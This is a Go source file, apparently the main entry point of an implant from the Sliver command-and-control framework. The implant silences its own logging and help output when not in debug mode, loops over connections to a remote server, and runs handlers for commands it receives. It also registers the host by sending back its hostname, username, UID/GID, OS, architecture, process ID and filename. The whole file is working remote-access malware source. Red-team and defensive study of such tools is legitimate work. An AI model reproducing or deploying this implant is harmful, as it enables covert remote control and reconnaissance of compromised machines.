package main

import (
	"flag"

	// {{if .MTLSServer}}

	// {{end}}
	"os"
	"os/user"
	"runtime"

	// {{if .Debug}}{{else}}
	"io/ioutil"
	// {{end}}

	"log"

	pb "sliver/protobuf/sliver"
	consts "sliver/sliver/constants"
	"sliver/sliver/handlers"
	"sliver/sliver/limits"
	"sliver/sliver/transports"

	"github.com/golang/protobuf/proto"
)

func main() {

	// {{if .Debug}}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	// {{else}}
	log.SetFlags(0)
	log.SetOutput(ioutil.Discard)
	// {{end}}

	flag.Usage = func() {} // No help!
	flag.Parse()

	// {{if .Debug}}
	log.Printf("Hello my name is %s", consts.SliverName)
	// {{end}}

	limits.ExecLimits() // Check to see if we should execute

	sysHandlers := handlers.GetSystemHandlers()
	for {
		connection := transports.StartConnectionLoop()
		if connection == nil {
			break
		}
		for envelope := range connection.Recv {
			if handler, ok := sysHandlers[envelope.Type]; ok {
				go handler(envelope.Data, func(data []byte, err error) {
					connection.Send <- &pb.Envelope{
						ID:   envelope.ID,
						Data: data,
					}
				})
			}
		}
	}
}

func getRegisterSliver() *pb.Envelope {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	data, _ := proto.Marshal(&pb.Register{
		Name:     sliverName,
		Hostname: hostname,
		Username: currentUser.Username,
		Uid:      currentUser.Uid,
		Gid:      currentUser.Gid,
		Os:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Pid:      int32(os.Getpid()),
		Filename: os.Args[0],
	})
	envelope := &pb.Envelope{
		Type: pb.MsgRegister,
		Data: data,
	}
	return envelope
}
